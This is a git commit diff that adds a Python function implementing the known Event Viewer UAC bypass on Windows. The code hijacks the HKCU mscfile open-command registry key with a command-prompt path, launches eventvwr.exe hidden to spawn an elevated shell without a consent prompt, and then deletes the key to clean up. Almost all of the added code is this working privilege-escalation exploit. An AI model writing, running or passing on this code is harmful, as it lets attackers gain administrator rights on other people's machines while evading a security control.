5af02e626ba813ba4e96a6a32842ac28f8e1fa38
Oscar <23297071+k3ring@users.noreply.github.com>
2018-05-01 11:12:24 +0200

    Update event_viewer_bypass.py

--- event_viewer_bypass.py
+++ event_viewer_bypass.py
@@ -1,10 +1,10 @@
 """
-
-https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
-
+---
 Bypasses Windows UAC by hijacking a special key in the Registry and inserting a custom command that will get invoked when
 the Windows Event Viewer is launched. It will spawn a second shell that has the UAC flag turned off.
 
+Based on; https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
+---
 """
 
 #imports
@@ -23,3 +23,37 @@ def cmd_path():
 		return os.path.join(path)
 	else:
 		return False
+#bypass
+def event_viewer_uac_bypass():
+	if (os.path.isfile(os.path.join("c:\windows\system32\eventvwr.exe")) == True):
+		try:
+			PromptBehaviorAdmin = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),"ConsentPromptBehaviorAdmin")
+			PromptOnSecureDesktop = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),"PromptOnSecureDesktop")
+		except Exception as error:
+			sys.exit()
+
+		if (PromptBehaviorAdmin[0] == "2" and PromptOnSecureDesktop[0] == "1"):
+			sys.exit()
+		else:
+			try:
+				key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\mscfile\shell\open\command")
+				#_winreg.SetValueEx(key,None,0,_winreg.REG_
+				_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
+			except Exception as error:
+				sys.exit()
+
+			try:
+				win32api.ShellExecute(0,None,"c:\windows\system32\eventvwr.exe",None,None,win32con.SW_HIDE)
+			except Exception as error:
+				sys.exit()
+
+			time.sleep(5)
+
+			try:
+#_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Cl")
+#_winreg.DeleteKey(_winreg.HK
+                        _winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\mscfile")
+			except Exception as error:
+				sys.exit()
+	else:
+		sys.exit()
